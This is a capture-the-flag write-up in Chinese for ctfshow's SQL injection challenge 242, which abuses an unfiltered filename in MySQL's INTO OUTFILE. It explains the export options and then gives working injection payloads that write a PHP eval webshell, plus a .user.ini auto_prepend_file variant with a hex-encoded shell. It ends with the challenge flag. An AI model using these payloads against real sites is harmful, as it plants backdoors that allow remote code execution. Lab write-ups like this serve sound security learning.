# ctfshow-sql242



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
  //备份表
  $sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";

```



 返回逻辑 

```
  //无过滤



```





```mysql
姿势盲区

SELECT ... INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        [export_options]

export_options:
    [{FIELDS | COLUMNS}
        [TERMINATED BY 'string']//分隔符
        [[OPTIONALLY] ENCLOSED BY 'char']
        [ESCAPED BY 'char']
    ]
    [LINES
        [STARTING BY 'string']
        [TERMINATED BY 'string']
    ]





“OPTION”参数为可选参数选项，其可能的取值有：

`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。

`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。



看完了这些东西，就知道该怎么写马了。这三个选项都可以：

FIELDS TERMINATED BY
LINES STARTING BY
LINES TERMINATED BY




网页路径
api/dump.php

filename=test.php' LINES STARTING BY '<?php eval($_POST[0]);?>'#

蚁剑连接
http://4d770825-5b11-42c6-a594-9317464c6121.challenge.ctf.show:8080/dump/test.php

根目录下/flag.here
ctfshow{9bf99e5e-3bcd-4082-abf9-d952d5ee809a}



也可以设置user.ini


filename=.user.ini' LINES STARTING BY ';' TERMINATED BY 0x000d0a6175746f5f70726570656e645f66696c653d6a652e6a70670d0a#
(/*其中有个回车*/
    auto_prepend_file=je.jpg)

filename=je.jpg' LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b305d293b3f3e#
(<?php eval($_POST[0]);?>)


```























